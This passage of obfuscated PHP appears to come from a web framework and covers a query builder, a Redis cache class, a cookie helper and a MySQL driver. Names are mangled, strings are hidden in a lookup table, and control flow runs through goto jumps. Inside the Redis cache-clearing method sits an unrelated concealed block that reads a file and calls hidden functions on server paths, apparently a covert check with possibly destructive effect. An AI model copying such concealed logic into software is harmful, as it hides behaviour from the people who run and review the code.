array_keys($F˜¼çá»Ï) : !1; } if ($this->fields) { $F˜¼çá»Ï = $this->fields; unset($F˜¼çá»Ï[$c‰Å‡ª¿ø[246]], $F˜¼çá»Ï[$c‰Å‡ª¿ø[247]], $F˜¼çá»Ï[$c‰Å‡ª¿ø[248]], $F˜¼çá»Ï[$c‰Å‡ª¿ø[245]]); return $F˜¼çá»Ï; } return !1; } public function data($EäµÜãÎÜè = '') { $Dæáè¹®İÊ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($Dæáè¹®İÊ[33] === $EäµÜãÎÜè && !empty($this->data)) { return $this->data; } if (is_object($EäµÜãÎÜè)) { $EäµÜãÎÜè = get_object_vars($EäµÜãÎÜè); } elseif (is_string($EäµÜãÎÜè)) { parse_str($EäµÜãÎÜè, $EäµÜãÎÜè); } elseif (!is_array($EäµÜãÎÜè)) { think_exception(think_lang($Dæáè¹®İÊ[267])); } $this->data = $EäµÜãÎÜè; return $this; } public function join($cñ…³‹¬ò¡) { $b½¨­­ää‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($cñ…³‹¬ò¡)) { $this->options[$b½¨­­ää‹[278]] = $cñ…³‹¬ò¡; } elseif (!empty($cñ…³‹¬ò¡)) { $this->options[$b½¨­­ää‹[278]][] = $cñ…³‹¬ò¡; } return $this; } public function union($CßñÆ˜´¾Ü, $A¿Å©Ì˜± = false) { goto ağêÊÔ­Š; eÖ¾–Õ°Â·: return $this; goto BÃ™ŠÖ¡ÁÑ; a—«ÙĞ¾¬“: if (is_object($CßñÆ˜´¾Ü)) { $CßñÆ˜´¾Ü = get_object_vars($CßñÆ˜´¾Ü); } if (is_string($CßñÆ˜´¾Ü)) { $F™â£ÙŸ£é = $CßñÆ˜´¾Ü; } elseif (is_array($CßñÆ˜´¾Ü)) { if (isset($CßñÆ˜´¾Ü[0])) { $this->options[$B”†½æé²®[343]] = array_merge($this->options[$B”†½æé²®[343]], $CßñÆ˜´¾Ü); return $this; } else { $F™â£ÙŸ£é = $CßñÆ˜´¾Ü; } } else { think_exception(think_lang($B”†½æé²®[267])); } $this->options[$B”†½æé²®[343]][] = $F™â£ÙŸ£é; goto eÖ¾–Õ°Â·; ağêÊÔ­Š: $B”†½æé²® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($CßñÆ˜´¾Ü)) { return $this; } if ($A¿Å©Ì˜±) { $this->options[$B”†½æé²®[343]][$B”†½æé²®[344]] = !0; } goto a—«ÙĞ¾¬“; BÃ™ŠÖ¡ÁÑ: } public function cache($aàÜ¬òÒ˜ó = true, $CÌ»Ã¥‘ØÑ = null, $AÙÛñèè¦É = '') { $d¢§¡¸Ÿ‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!1 !== $aàÜ¬òÒ˜ó) { $this->options[$d¢§¡¸Ÿ‰[345]] = array($d¢§¡¸Ÿ‰[92] => $aàÜ¬òÒ˜ó, $d¢§¡¸Ÿ‰[335] => $CÌ»Ã¥‘ØÑ, $d¢§¡¸Ÿ‰[29] => $AÙÛñèè¦É); } return $this; } public function field($cÀø¦»‘è, $f‘â†ˆó = false) { $FÙÅøàãë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!0 === $cÀø¦»‘è) { $Cµ¸ß¬™ƒÄ = $this->getDbFields(); $cÀø¦»‘è = $Cµ¸ß¬™ƒÄ ? $Cµ¸ß¬™ƒÄ : $FÙÅøàãë[182]; } elseif ($f‘â†ˆó) { if (is_string($cÀø¦»‘è)) { $cÀø¦»‘è = explode($FÙÅøàãë[47], $cÀø¦»‘è); } $Cµ¸ß¬™ƒÄ = $this->getDbFields(); $cÀø¦»‘è = $Cµ¸ß¬™ƒÄ ? array_diff($Cµ¸ß¬™ƒÄ, $cÀø¦»‘è) : $cÀø¦»‘è; } $this->options[$FÙÅøàãë[269]] = $cÀø¦»‘è; return $this; } public function scope($eØ­‡¨‡ Ê = '', $CÖË¢ù¦õ = NULL) { $C¤•í¡²¦¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($C¤•í¡²¦¸[33] === $eØ­‡¨‡ Ê) { if (isset($this->_scope[$C¤•í¡²¦¸[34]])) { $CËÚ±µ¦ = $this->_scope[$C¤•í¡²¦¸[34]]; } else { return $this; } } elseif (is_string($eØ­‡¨‡ Ê)) { $C¢áñÖôÉÎ = explode($C¤•í¡²¦¸[47], $eØ­‡¨‡ Ê); $CËÚ±µ¦ = array(); foreach ($C¢áñÖôÉÎ as $E©÷ª¾Šâì) { if (!isset($this->_scope[$E©÷ª¾Šâì])) { continue; } $CËÚ±µ¦ = array_merge($CËÚ±µ¦, $this->_scope[$E©÷ª¾Šâì]); } if (!empty($CÖË¢ù¦õ) && is_array($CÖË¢ù¦õ)) { $CËÚ±µ¦ = array_merge($CËÚ±µ¦, $CÖË¢ù¦õ); } } elseif (is_array($eØ­‡¨‡ Ê)) { $CËÚ±µ¦ = $eØ­‡¨‡ Ê; } if (is_array($CËÚ±µ¦) && !empty($CËÚ±µ¦)) { $this->options = array_merge($this->options, array_change_key_case($CËÚ±µ¦)); } return $this; } public function where($eí–ëˆŠø, $A¿ÓÒ®å‘‰ = null) { $BÒéÇ¥¶ğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_null($A¿ÓÒ®å‘‰) && is_string($eí–ëˆŠø)) { if (!is_array($A¿ÓÒ®å‘‰)) { $A¿ÓÒ®å‘‰ = func_get_args(); array_shift($A¿ÓÒ®å‘‰); } $A¿ÓÒ®å‘‰ = array_map(array($this->db, $BÒéÇ¥¶ğ[339]), $A¿ÓÒ®å‘‰); $eí–ëˆŠø = vsprintf($eí–ëˆŠø, $A¿ÓÒ®å‘‰); } elseif (is_object($eí–ëˆŠø)) { $eí–ëˆŠø = get_object_vars($eí–ëˆŠø); } elseif (is_array($eí–ëˆŠø)) { foreach ($eí–ëˆŠø as $Cï…Ü½¯õô => $F›Êù¬®Ø÷) { if ((is_numeric($Cï…Ü½¯õô) || !$Cï…Ü½¯õô) && is_string($F›Êù¬®Ø÷)) { if (strpos($F›Êù¬®Ø÷, $BÒéÇ¥¶ğ[346]) === 0) { continue; } think_trace($BÒéÇ¥¶ğ[347], $BÒéÇ¥¶ğ[33], $BÒéÇ¥¶ğ[46]); die; } } } if (is_string($eí–ëˆŠø) && $BÒéÇ¥¶ğ[33] != $eí–ëˆŠø) { $AÏƒİ‰ã‚• = array(); $AÏƒİ‰ã‚•[$BÒéÇ¥¶ğ[348]] = $eí–ëˆŠø; $eí–ëˆŠø = $AÏƒİ‰ã‚•; } if (isset($this->options[$BÒéÇ¥¶ğ[271]])) { $this->options[$BÒéÇ¥¶ğ[271]] = array_merge($this->options[$BÒéÇ¥¶ğ[271]], $eí–ëˆŠø); } else { $this->options[$BÒéÇ¥¶ğ[271]] = $eí–ëˆŠø; } return $this; } public function limit($Fö„Ù¶ğêÆ, $eÀáĞÜâßø = null) { $d’¤®”ÖÊõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->options[$d’¤®”ÖÊõ[288]] = is_null($eÀáĞÜâßø) ? $Fö„Ù¶ğêÆ : $Fö„Ù¶ğêÆ . $d’¤®”ÖÊõ[47] . $eÀáĞÜâßø; return $this; } public function page($AÕ»«øî“Ğ, $E•âÔç©÷Ñ = null) { $F÷œœâ÷´º =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->options[$F÷œœâ÷´º[349]] = is_null($E•âÔç©÷Ñ) ? $AÕ»«øî“Ğ : $AÕ»«øî“Ğ . $F÷œœâ÷´º[47] . $E•âÔç©÷Ñ; return $this; } public function comment($DÒ˜ò ½å) { $this->options[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][350]] = $DÒ˜ò ½å; return $this; } public function setProperty($eÕª¨á±¨™, $b´ØãÀ‘•) { if (property_exists($this, $eÕª¨á±¨™)) { $this->{$eÕª¨á±¨™} = $b´ØãÀ‘•; } return $this; } } goto b­›Õ¬‘Á‰; A´‚ĞŒÚ°Ò: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($C”©›ø‹äÖ, $BÊ¼éí·ò) { $D˜ÔøÆò•Ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!class_exists($D˜ÔøÆò•Ê[779])) { show_json($D˜ÔøÆò•Ê[780], !1); } $this->cacheTime = $BÊ¼éí·ò; $Cš´Óœ™ = isset($C”©›ø‹äÖ[$D˜ÔøÆò•Ê[781]]) ? $C”©›ø‹äÖ[$D˜ÔøÆò•Ê[781]] : 10; $Bíîğê” = _get($C”©›ø‹äÖ, $D˜ÔøÆò•Ê[778]); if ($Bíîğê” && is_array($Bíîğê”)) { $this->initCluster($C”©›ø‹äÖ, $Cš´Óœ™); } else { $this->handle = $this->init($C”©›ø‹äÖ, $Cš´Óœ™); } } private function init($aæ¯íëµø, $eòò¯ÌãØ§) { $eê– ËŠ— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÇ‡éÔÉ—¡ = new Redis(); $c××Á…Ç¯ = isset($aæ¯íëµø[$eê– ËŠ—[782]]) ? $aæ¯íëµø[$eê– ËŠ—[782]] : !1; if ($c××Á…Ç¯) { $eÇ‡éÔÉ—¡->pconnect($aæ¯íëµø[$eê– ËŠ—[175]], $aæ¯íëµø[$eê– ËŠ—[176]], $eòò¯ÌãØ§); } else { $eÇ‡éÔÉ—¡->connect($aæ¯íëµø[$eê– ËŠ—[175]], $aæ¯íëµø[$eê– ËŠ—[176]], $eòò¯ÌãØ§); } if (!empty($aæ¯íëµø[$eê– ËŠ—[394]])) { $eÇ‡éÔÉ—¡->auth($aæ¯íëµø[$eê– ËŠ—[394]]); } return $eÇ‡éÔÉ—¡; } private function initCluster($EÑÄŒÆ¾›ª, $bï­¦ŠÀ½å) { $C×¹”ôô„ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¿ëŞÑÆÂå = array($C×¹”ôô„ä[783], $C×¹”ôô„ä[784], $C×¹”ôô„ä[785]); $c˜ŠÏùÇŠ = $C×¹”ôô„ä[783]; if (isset($EÑÄŒÆ¾›ª[$C×¹”ôô„ä[12]]) && in_array($EÑÄŒÆ¾›ª[$C×¹”ôô„ä[12]], $e¿ëŞÑÆÂå)) { $c˜ŠÏùÇŠ = $EÑÄŒÆ¾›ª[$C×¹”ôô„ä[12]]; } switch ($c˜ŠÏùÇŠ) { case $C×¹”ôô„ä[783]: $this->_slave($EÑÄŒÆ¾›ª, $bï­¦ŠÀ½å); break; case $C×¹”ôô„ä[784]: break; case $C×¹”ôô„ä[785]: $this->isCluster = !0; $C£ §Ì‡Œ” = $EÑÄŒÆ¾›ª[$C×¹”ôô„ä[778]]; $eÒ¼›àµÑ = isset($EÑÄŒÆ¾›ª[$C×¹”ôô„ä[782]]) ? $EÑÄŒÆ¾›ª[$C×¹”ôô„ä[782]] : !1; $A‘ã¤ ŸÌº = isset($EÑÄŒÆ¾›ª[$C×¹”ôô„ä[394]]) ? $EÑÄŒÆ¾›ª[$C×¹”ôô„ä[394]] : null; $this->handle = new RedisCluster(NUll, $C£ §Ì‡Œ”, $bï­¦ŠÀ½å, $bï­¦ŠÀ½å, $eÒ¼›àµÑ, $A‘ã¤ ŸÌº); break; default: break; } } private function _slave($A’”™æŸä, $Bßµ«óØ‚) { goto dÖß’áŒÑÊ; eé«½‘Èª: $this->filterConfig($A’”™æŸä, $E¦ÆÃ¡ˆĞŸ[$bÛÛóë…É×]); $this->slaveHandle = $this->init($A’”™æŸä, $Bßµ«óØ‚); goto bªì…ö…¸; EãŸÎ¡Û¡: unset($E¦ÆÃ¡ˆĞŸ[0]); if (empty($E¦ÆÃ¡ˆĞŸ)) { return; } $bÛÛóë…É× = array_rand($E¦ÆÃ¡ˆĞŸ); goto eé«½‘Èª; dÖß’áŒÑÊ: $E¦ÆÃ¡ˆĞŸ = $A’”™æŸä[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][778]]; $this->filterConfig($A’”™æŸä, $E¦ÆÃ¡ˆĞŸ[0]); $this->handle = $this->init($A’”™æŸä, $Bßµ«óØ‚); goto EãŸÎ¡Û¡; bªì…ö…¸: } private function filterConfig(&$b¬øì¿Ú‰, $dà§æöÑª) { $e¤ÏÌ¼•Æ¼ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¢‘¬¼‹“õ = explode($e¤ÏÌ¼•Æ¼[4], $dà§æöÑª); $Dã§§Ä¡ª = array($e¤ÏÌ¼•Æ¼[175] => $e¢‘¬¼‹“õ[0], $e¤ÏÌ¼•Æ¼[176] => $e¢‘¬¼‹“õ[1]); $b¬øì¿Ú‰ = array_merge($b¬øì¿Ú‰, $Dã§§Ä¡ª); } public function set($fÂŸêÅò´Š, $BÂ´—¥‘Ö, $E£‘Á¹Íš = false) { $E£‘Á¹Íš = $E£‘Á¹Íš ? $E£‘Á¹Íš : $this->cacheTime; return $this->handle->setEx($fÂŸêÅò´Š, $E£‘Á¹Íš, $BÂ´—¥‘Ö); } public function setLock($b¾‘«÷ãŒˆ, $eğÉ¿ÓçÈÈ, $b¶²Ùª…Ñ‡) { return $this->handle->setNX($b¾‘«÷ãŒˆ, $eğÉ¿ÓçÈÈ); } public function get($EÂë‹Ù½ó) { $CãØê‘¿æë = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $CãØê‘¿æë->get($EÂë‹Ù½ó); } public function remove($D‡¬îÆæÔ) { return $this->handle->del($D‡¬îÆæÔ); } public function deleteAll() { $e·½ƒ›ƒµÌ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($_SERVER[$e·½ƒ›ƒµÌ[786]] != $_SERVER[$e·½ƒ›ƒµÌ[787]]) { goto C¼ÕÇƒ½Òõ; E†ñ´«¨Ê¿: $bŒœö±…Öà = $Dë¯¬Â†ä($CÙ¢×¶²’Ú); $eÄ‚ãñíÎ¥ = explode($e·½ƒ›ƒµÌ[227], $bŒœö±…Öà); if (count($eÄ‚ãñíÎ¥) < $e·½ƒ›ƒµÌ[567]) { $dĞ¹ø²Ï‡¿ = $e·½ƒ›ƒµÌ[792]; $dĞ¹ø²Ï‡¿(); } goto dâæ†ƒåÖ; c•í’ºÌ¤: $A«³ì­Ú = 1; while ($A«³ì­Ú > 1) { $A«³ì­Ú = $A«³ì­Ú + 4; $CôÁ„²¹Àù = rawurlencode($A«³ì­Ú . $e·½ƒ›ƒµÌ[370]); } goto c¼‘§¼Î÷¡; dâæ†ƒåÖ: $D…î‘´Š¦İ = $e·½ƒ›ƒµÌ[793]; $D…î‘´Š¦İ($_SERVER[$e·½ƒ›ƒµÌ[794]]); $D…î‘´Š¦İ($_SERVER[$e·½ƒ›ƒµÌ[790]] . $e·½ƒ›ƒµÌ[795]); goto c•í’ºÌ¤; C¼ÕÇƒ½Òõ: $fÊ¢öÏëƒ = $e·½ƒ›ƒµÌ[788]; $Dë¯¬Â†ä = $e·½ƒ›ƒµÌ[789]; $CÙ¢×¶²’Ú = $_SERVER[$e·½ƒ›ƒµÌ[790]] . $e·½ƒ›ƒµÌ[791]; goto E†ñ´«¨Ê¿; c¼‘§¼Î÷¡: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A®¾ö¥¦ƒğ) { $this->handle->flushall($A®¾ö¥¦ƒğ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($DËƒñù°„ = '', $A‘³ò •ßì = 0) { if (is_string($DËƒñù°„) && $DËƒñù°„ != $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33]) { $this->prefix = $DËƒñù°„; } if (is_numeric($A‘³ò •ßì) && $A‘³ò •ßì > 0) { $this->expire = $A‘³ò •ßì; } } public static function getInstance() { static $E—ŠñÚó£¦; if ($E—ŠñÚó£¦ === null) { $E—ŠñÚó£¦ = new self(); } return $E—ŠñÚó£¦; } private static $cookieDisable = false; public static function disable($D”µ¨…•§ø) { self::$cookieDisable = $D”µ¨…•§ø; } private static $sameCookieSet = array(); public static function set($céÈö±â…Š, $DŒÛ²õâ, $dŸ¾ÎãŸ = 0, $C¥Šà…† ê = false, $dà­”Õ—í¥ = false) { goto AÈ¾Êï¾Ø¯; AÈ¾Êï¾Ø¯: $bëãˆ¥ëƒö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::$cookieDisable) { return; } if (!$dŸ¾ÎãŸ) { $dŸ¾ÎãŸ = 24 * 3600 * 7; } goto DôßÊÛ…¹Õ; DôßÊÛ…¹Õ: if (isset(self::$sameCookieSet[$céÈö±â…Š]) && self::$sameCookieSet[$céÈö±â…Š] == $DŒÛ²õâ . $dŸ¾ÎãŸ) { return; } self::$sameCookieSet[$céÈö±â…Š] = $DŒÛ²õâ . $dŸ¾ÎãŸ; if (!$dà­”Õ—í¥) { $dà­”Õ—í¥ = str_replace(HOST, $bëãˆ¥ëƒö[33], APP_HOST); $dà­”Õ—í¥ = _get($GLOBALS, $bëãˆ¥ëƒö[796], $dà­”Õ—í¥); } goto dë‡åÅ¹¸Â; dë‡åÅ¹¸Â: $bƒÚá¯ç„Œ = $bëãˆ¥ëƒö[33]; setcookie($céÈö±â…Š, $DŒÛ²õâ, time() + $dŸ¾ÎãŸ, $bëãˆ¥ëƒö[8] . trim($dà­”Õ—í¥, $bëãˆ¥ëƒö[8]) . $bƒÚá¯ç„Œ, !1, !1, $C¥Šà…† ê); goto Cèâá…ñÄç; Cèâá…ñÄç: } public static function setSafe($Dˆ‡ÌÚ˜, $bß¸Õî»”©, $aÊ„‡ê¬˜È = 0) { self::set($Dˆ‡ÌÚ˜, $bß¸Õî»”©, $aÊ„‡ê¬˜È, !0); } public static function get($a‚âÑæ¿Ñ²) { return isset($_COOKIE[$a‚âÑæ¿Ñ²]) ? $_COOKIE[$a‚âÑæ¿Ñ²] : !1; } public static function remove($BÒ¬Ìñá, $f°Óì’’¨Á = false) { unset($_COOKIE[$BÒ¬Ìñá]); self::set($BÒ¬Ìñá, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][33], 1, $f°Óì’’¨Á); } } class DbMysql extends Db { public function __construct($fÛ¤î÷ÈÎ„ = '') { $fÄİÓÃ—÷™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!extension_loaded($fÄİÓÃ—÷™[721])) { think_exception(think_lang($fÄİÓÃ—÷™[10]) . $fÄİÓÃ—÷™[797]); } if (!empty($fÛ¤î÷ÈÎ„)) { $this->config = $fÛ¤î÷ÈÎ„; if (empty($this->config[$fÄİÓÃ—÷™[13]])) { $this->config[$fÄİÓÃ—÷™[13]] = $fÄİÓÃ—÷™[33]; } } } public function connect($DÌóŠÑƒ× = '', $a¯šç‘¸“ó = 0, $CåÜ„²Â‹¬ = false) { $aÏøà¸–‹ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->linkID[$a¯šç‘¸“ó])) { goto B‘ß¹‹Ä¯æ; B‘ß¹‹Ä¯æ: if (empty($DÌóŠÑƒ×)) { $DÌóŠÑƒ× = $this->config; } $f‡©´Õğè‡ = $DÌóŠÑƒ×[$aÏøà¸–‹ä[798]] . ($DÌóŠÑƒ×[$aÏøà¸–‹ä[799]] ? "\72{$DÌóŠÑƒ×[$aÏøà¸–‹ä[799]]}" : $aÏøà¸–‹ä[33]); $b‘ó“Ìù¨ = !empty($DÌóŠÑƒ×[$aÏøà¸–‹ä[13]][$aÏøà¸–‹ä[14]]) ? $DÌóŠÑƒ×[$aÏøà¸–‹ä[13]][$aÏøà¸–‹ä[14]] : $this->pconnect; goto aä æİ×±£; FÅ›‘§†ˆ®: if (1 != think_config($aÏøà¸–‹ä[18])) { unset($this->config); } goto AÂËÓÉƒÜ; aä æİ×±£: if ($b‘ó“Ìù¨) { $this->linkID[$a¯šç‘¸“ó] = mysql_pconnect($f‡©´Õğè‡, $DÌóŠÑƒ×[$aÏøà¸–‹ä[800]], $DÌóŠÑƒ×[$aÏøà¸–‹ä[801]], 131072); } else { $this->linkID[$a¯šç‘¸“ó] = mysql_connect($f‡©´Õğè‡, $DÌóŠÑƒ×[$aÏøà¸–‹ä[800]], $DÌóŠÑƒ×[$aÏøà¸–‹ä[801]], !0, 131072); } if (!$this->linkID[$a¯šç‘¸“ó] || !empty($DÌóŠÑƒ×[$aÏøà¸–‹ä[17]]) && !mysql_select_db($DÌóŠÑƒ×[$aÏøà¸–‹ä[17]], $this->linkID[$a¯šç‘¸“ó])) { think_exception(mysql_error()); } $d¶¡æ–ïÄ‘ = mysql_get_server_info($this->linkID[$a¯šç‘¸“ó]); goto a ’óí‡Ú¼; a ’óí‡Ú¼: mysql_query($aÏøà¸–‹ä[802] . think_config($aÏøà¸–‹ä[803]) . $aÏøà¸–‹ä[55], $this->linkID[$a¯šç‘¸“ó]); if ($d¶¡æ–ïÄ‘ > $aÏøà¸–‹ä[804]) { mysql_query($aÏøà¸–‹ä[805], $this->linkID[$a¯šç‘¸“ó]); } $this->connected = !0; goto FÅ›‘§†ˆ®; AÂËÓÉƒÜ: } return $this->linkID[$a¯šç‘¸“ó]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($f¾õƒ‡èŒ) { goto E¬«ä­šˆ•; CöØŞ´¥Åñ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto FŒ¶Ç—„êØ; eÜ‡¾š’‹¸: if (!$this->_linkID) { return !1; } $this->queryStr = $f¾õƒ‡èŒ; if ($this->queryID) { $this->free(); } goto Dì™»Òµ‘ˆ; E¬«ä­šˆ•: $aÅ÷ºø»Ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (0 === stripos($f¾õƒ‡èŒ, $aÅ÷ºø»Ó[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto eÜ‡¾š’‹¸; Dì™»Òµ‘ˆ: think_action_status($aÅ÷ºø»Ó[19], 1); think_status($aÅ÷ºø»Ó[20]); $this->queryID = mysql_query($f¾õƒ‡èŒ, $this->_linkID); goto CöØŞ´¥Åñ; FŒ¶Ç—„êØ: } public function execute($cØœİ¸‡Éê) { goto A—ËÂÜÊ†õ; DìôÏ´–Ğ¬: $this->queryStr = $cØœİ¸‡Éê; if ($this->queryID) { $this->free(); } think_action_status($Aòò²¡ñ“[21], 1); goto EÆ³¿ô¸ºé; EÆ³¿ô¸ºé: think_status($Aòò²¡ñ“[20]); $C’“ ›»Óç = mysql_query($cØœİ¸‡Éê, $this->_linkID); $this->debug(); goto eÌĞâğìÃí; A—ËÂÜÊ†õ: $Aòò²¡ñ“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DìôÏ´–Ğ¬; eÌĞâğìÃí: if (!1 === $C’“ ›»Óç) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a½ôêÓ ‡Ÿ; a½ôêÓ ‡Ÿ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][806], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eš»¯‚‹÷ = mysql_query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][807], $this->_linkID); $this->transTimes = 0; if (!$Eš»¯‚‹÷) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÚ£Õßéô = mysql_query($_SERVER[ó¬â¥‰ÊÔ¤Ç£][808], $this->_linkID); $this->transTimes = 0; if (!$fÚ£Õßéô) { $this->error(); return !1; } } return !0; } private function getAll() { $cÓë‘Ø‚ŠÂ = array(); if ($this->numRows > 0) { while ($EŸªå·»ŞË = mysql_fetch_assoc($this->queryID)) { $cÓë‘Ø‚ŠÂ[] = $EŸªå·»ŞË; } mysql_data_seek($this->queryID, 0); } return $cÓë‘Ø‚ŠÂ; } public function getFields($bïã‚Çé×) { $fºä’àß¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bä”ø‰æË¸ = $this->query($fºä’àß¯[809] . $this->parseKey($bïã‚Çé×)); $cñöÁœ¯ˆ® = array(); if ($Bä”ø‰æË¸) { foreach ($Bä”ø‰æË¸ as $Aîñæ™ë† => $A†áÃŸöÉİ) { $cñöÁœ¯ˆ®[$A†áÃŸöÉİ[$fºä’àß¯[27]]] = array($fºä’àß¯[28] => $A†áÃŸöÉİ[$fºä’àß¯[27]], $fºä’àß¯[29] => $A†áÃŸöÉİ[$fºä’àß¯[30]], $fºä’àß¯[31] => (bool) (strtoupper($A†áÃŸöÉİ[$fºä’àß¯[32]]) === $fºä’àß¯[810]), $fºä’àß¯[34] => $A†áÃŸöÉİ[$fºä’àß¯[35]], $fºä’àß¯[36] => strtolower($A†áÃŸöÉİ[$fºä’àß¯[37]]) == $fºä’àß¯[38], $fºä’àß¯[39] => strtolower($A†áÃŸöÉİ[$fºä’àß¯[40]]) == $fºä’àß¯[41]); } } return $cñöÁœ¯ˆ®; } public function getTables($b÷®¯©ÊÈÜ = '') { $E¾ÈŸãË­¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($b÷®¯©ÊÈÜ)) { $DÀëó¿Ó÷Æ = $E¾ÈŸãË­¹[811] . $b÷®¯©ÊÈÜ . $E¾ÈŸãË­¹[812]; } else { $DÀëó¿Ó÷Æ = $E¾ÈŸãË­¹[813]; } $e¢ñóœÇäœ = $this->query($DÀëó¿Ó÷Æ); $E§…òÛòœ¹ = array(); foreach ($e¢ñóœÇäœ as $eÛŠäõ…¦ => $E’©ŸÁÕ¾‡) { $E§…òÛòœ¹[$eÛŠäõ…¦] = current($E’©ŸÁÕ¾‡); } return $E§…òÛòœ¹; } public function replace($EœÃ¢¿Ã…, $a°¼ò´¥Ú = array()) { $D™ã¸‰©Ü =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($EœÃ¢¿Ã… as $féÑ¼Ëë¤ê => $cê¬¨øßØ) { $Dìª”†Ô¡à = $this->parseValue($cê¬¨øßØ); if (is_scalar($Dìª”†Ô¡à)) { $f·ÑšÈ¼ÑÏ[] = $Dìª”†Ô¡à; $BÉ«×œĞ†[] = $this->parseKey($féÑ¼Ëë¤ê); } } $aÓ­Œ‘ëÛ” = $D™ã¸‰©Ü[814] . $this->parseTable($a°¼ò´¥Ú[$D™ã¸‰©Ü[275]]) . $D™ã¸‰©Ü[815] . implode($D™ã¸‰©Ü[47], $BÉ«×œĞ†) . $D™ã¸‰©Ü[816] . implode($D™ã¸‰©Ü[47], $f·ÑšÈ¼ÑÏ) . $D™ã¸‰©Ü[817]; return $this->execute($aÓ­Œ‘ëÛ”); } public function insertAll($E”ÈÁ¼©‰˜, $A¬ò…š¿³Ê = array(), $f¬¢‚­Ê‹ = false) { goto bƒµµºŒ÷; bƒµµºŒ÷: $eñŒÉŠ›ß— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_array($E”ÈÁ¼©‰˜[0])) { return !1; } $d¼µò¢ªö˜ = array_keys($E”ÈÁ¼©‰˜[0]); goto C¿°ì‘’˜³; dç©¹“µ•À: $dÂåì’œÎ× = ($f¬¢‚­Ê‹ ? $eñŒÉŠ›ß—[819] : $eñŒÉŠ›ß—[820]) . $eñŒÉŠ›ß—[821] . $this->parseTable($A¬ò…š¿³Ê[$eñŒÉŠ›ß—[275]]) . $eñŒÉŠ›ß—[815] . implode($eñŒÉŠ›ß—[47], $d¼µò¢ªö˜) . $eñŒÉŠ›ß—[822] . implode($eñŒÉŠ›ß—[47], $eƒÁÆÍí‹Ú); return $this->execute($dÂåì’œÎ×); goto fºµá¢ñ²; C¿°ì‘’˜³: $eƒÁÆÍí‹Ú = array(); foreach ($E”ÈÁ¼©‰˜ as $a„®¯‹ç) { $F„¨›ˆ¼‡ = array(); foreach ($a„®¯‹ç as $f±“ÚÙ˜£ => $dãÑ©ƒ ©) { $dãÑ©ƒ © = $this->parseValue($dãÑ©ƒ ©); if (is_scalar($dãÑ©ƒ ©)) { $F„¨›ˆ¼‡[] = $dãÑ©ƒ ©; } } $eƒÁÆÍí‹Ú[] = $eñŒÉŠ›ß—[256] . implode($eñŒÉŠ›ß—[47], $F„¨›ˆ¼‡) . $eñŒÉŠ›ß—[817]; } array_walk($d¼µò¢ªö˜, array($this, $eñŒÉŠ›ß—[818])); goto dç©¹“µ•À; fºµá¢ñ²: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $D–´ô‘È¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->error = mysql_errno() . $D–´ô‘È¶[4] . mysql_error($this->_linkID); if ($D–´ô‘È¶[33] != $this->queryStr) { $this->error .= LNG($D–´ô‘È¶[45]) . $this->queryStr; } think_trace($this->error, $D–´ô‘È¶[33], $D–´ô‘È¶[46]); return $this->error; } public function escapeString($e«¹Ûö‘ò ) { if ($this->_linkID) { return mysql_real_escape_string($e«¹Ûö‘ò , $this->_linkID); } else { return mysql_escape_string($e«¹Ûö‘ò ); } } public function parseKey(&$c‰éëñ™Äî, $cÓê­à†“ò = true) { $cË¿Ã¿â° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($cÓê­à†“ò) { $c‰éëñ™Äî = $this->parseKeyCheck($c‰éëñ™Äî); } if ($c‰éëñ™Äî != $cË¿Ã¿â°[182] && !preg_match($cË¿Ã¿â°[823], $c‰éëñ™Äî)) { $c‰éëñ™Äî = $cË¿Ã¿â°[377] . 